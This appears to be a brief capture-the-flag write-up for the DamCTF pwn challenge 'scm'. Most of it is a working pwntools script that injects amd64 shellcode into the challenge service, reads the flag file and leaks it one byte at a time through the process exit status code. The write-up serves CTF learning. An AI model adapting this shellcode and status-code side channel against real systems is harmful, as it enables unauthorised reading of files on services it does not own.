# scm (pwn)

Brute-force each char based on status code leak:

```py
from pwn import *
context.log_level = 'error'
count = 0
while True:
    p = remote("chals.damctf.xyz", 30200)
    context.arch = "amd64"
    shellcode = f'''
    mov rax,0x2
    mov r12, 0x00000067616c66
    push r12
    mov rdi,rsp
    mov rsi,0x0
    mov rdx,0x0
    syscall
    mov rdi,rax
    mov rax,0x0
    mov rsi,rsp
    mov rdx,100
    syscall
    mov rdi, [rsp+{count}]
    mov rax,60
    syscall
    '''
    p.recvuntil(b":")
    p.sendline(b"1")
    p.sendline(b"1")
    p.sendline(b"98")

    p.send(asm(shellcode))
    p.sendline(b"2")
    p.sendline(b"0")
    p.sendline(b"y")
    p.sendline(b"65281")
    p.sendline(b"n")
    p.sendline(b"3")
    p.sendline(b"0")
    p.recvuntil(b"status code ")
    STATUS = p.recvline()
    print(hex(int(STATUS.decode())))
    p.close()
    count += 1
```

This prints each flag char as hex chars:
```
0x6400
0x6100
0x6d00
...
0x7d00
```
making it easy to decode the flag.
